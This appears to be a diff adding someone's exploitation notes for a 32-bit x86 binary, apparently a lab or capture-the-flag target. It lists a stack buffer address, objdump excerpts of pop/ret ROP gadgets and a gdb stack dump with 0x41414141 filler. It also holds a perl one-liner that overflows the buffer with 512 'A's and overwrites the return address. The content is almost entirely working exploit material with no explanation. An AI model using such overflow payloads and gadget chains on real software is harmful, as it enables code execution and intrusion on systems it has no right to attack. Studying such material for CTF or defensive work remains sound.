@@ -1,0 +1,39 @@
+name @ 0xbffffad4
+
+80499a6:	83 c4 18             	add    $0x18,%esp
+80499a9:	5b                   	pop    %ebx
+80499aa:	c3                   	ret
+
+804813a:       58                      pop    %eax
+804813b:       5b                      pop    %ebx
+804813c:       c9                      leave  
+804813d:       c3                      ret 
+
+0xbffffac0:	0x080b4e14	0xbffffbd4	0x080d69c0	0x00000000
+0xbffffad0:	0x00000000	0x41414141	0x2031000a	0x00021000
+0xbffffae0:	0x00021000	0x00000003	0x00000028	0x080dde30
+0xbffffaf0:	0x00000003	0x00000014	0x00000000	0x080dde01
+0xbffffb00:	0x00000137	0x000009c8	0x080dde30	0x0000005e
+0xbffffb10:	0x000009b0	0x08100cd0	0x080dde38	0x080dde00
+0xbffffb20:	0x000009b8	0xbffffb40	0x0805edb0	0x080dde00
+0xbffffb30:	0x00000002	0x080dfcd8	0x080dde00	0x000009b0
+ 
+perl -e 'print "huseyin\n2\n" . "A"x512 . "\xd4\xfa\xff\xbf"'
+
+
+ 809a8ca:	58                   	pop    %eax
+ 809a8cb:	5b                   	pop    %ebx
+ 809a8cc:	5e                   	pop    %esi
+ 809a8cd:	5f                   	pop    %edi
+ 809a8ce:	c3                   	ret 
+
+ 809a92a:	58                   	pop    %eax
+ 809a92b:	5b                   	pop    %ebx
+ 809a92c:	5e                   	pop    %esi
+ 809a92d:	5f                   	pop    %edi
+ 809a92e:	c3                   	ret  
+
+ 80b85f8:       58                      pop    %eax
+ 80b85f9:       59                      pop    %ecx
+ 80b85fa:       5a                      pop    %edx
+ 80b85fb:       5b                      pop    %ebx
